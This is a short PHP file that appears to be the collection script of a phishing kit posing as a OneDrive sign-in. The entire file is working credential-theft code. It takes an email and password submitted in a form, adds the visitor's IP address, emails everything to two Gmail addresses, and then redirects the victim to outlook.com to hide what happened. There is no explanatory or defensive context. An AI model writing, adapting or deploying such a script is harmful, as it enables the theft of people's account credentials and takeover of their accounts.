<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Onedrive tare_ama || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Pass: ".$_POST['formtext2']."\n";
$message .= "----: || Tare logs || :------\n";
$message .= "IP: ".$ip."\n";
$recipient="Jamnak66@gmail.com,opalornabella@gmail.com";
$subject = "tare other mail | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location:https://outlook.com");
?>